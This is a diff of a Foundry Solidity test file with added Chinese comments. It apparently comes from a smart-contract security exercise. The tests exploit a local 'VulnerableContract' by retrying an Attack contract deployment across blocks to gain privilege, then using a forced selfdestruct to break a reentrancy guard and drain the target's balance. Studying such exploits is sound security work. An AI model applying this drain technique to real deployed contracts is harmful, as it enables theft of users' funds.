@@ -27,22 +27,22 @@ contract VulnerableContractTest is Test{
 
         (uint256 keys, uint256 balances, bool isGenKey) = vulnerableContract.keysAndBalancesAndIsGenKey(user1);
         console2.log(keys, balances, isGenKey);
+        // 每個人只能 genKey 一次
         vm.expectRevert();
         vulnerableContract.genKey{value: 0.001 ether}();
     }
     function test2_attacker_GenKey() public {
-        console2.log("target", target);
+        // 透過攻擊者合約來 genKey，以此達到攻擊者可以 genKey 多次，並且取得 priviledge = 5
         bool ispriviledge = false;
-        console2.log("target balance", target.balance);
         while (!ispriviledge) {
             try new Attack{value: 0.001 ether}(target) returns (Attack) {
-                // Contract creation succeeded, break out of the loop
+                // 判斷是否成功取得 priviledge = 5
+                // 若否，則重新執行並 roll block number 至下一個 block
+                // 若是，則跳出迴圈
                 attacker = new Attack{value: 0.001 ether}(target);
                 ispriviledge = true;
                 break;
             } catch {
-                // Contract creation failed, continue the loop
-                // You can add additional handling or logging here if needed
                 vm.roll(block.number + 1);
                 console2.log("Contract creation failed, continue the loop");
             }
@@ -51,13 +51,16 @@ contract VulnerableContractTest is Test{
     }
     function test3_claimDeopsit() public {
         this.test2_attacker_GenKey();
+        // 透過攻擊者合約來 claimDeposit，以此達到攻擊者可以取得 target 合約的 balance
         vm.expectRevert();
         attacker.claimDeposit();
+        // 需先 selfdestruct 合約以打破 target 合約的 reentrancy guard
         selfdestructcontract = new Selfdestruct{value: 0.001 ether}();
         console2.log("target balance before destroy", target.balance);
         selfdestructcontract.destroy(target);
         console2.log("target balance after destroy", target.balance);
         console2.log("attacker balance before claim", address(attacker).balance);
+        // 透過攻擊者合約來 claimDeposit，這裡會成功取得除 selfdestruct 之外的所有 balance
         attacker.claimDeposit();
         console2.log("target balance after claim", target.balance);
         console2.log("attacker balance after claim", address(attacker).balance);
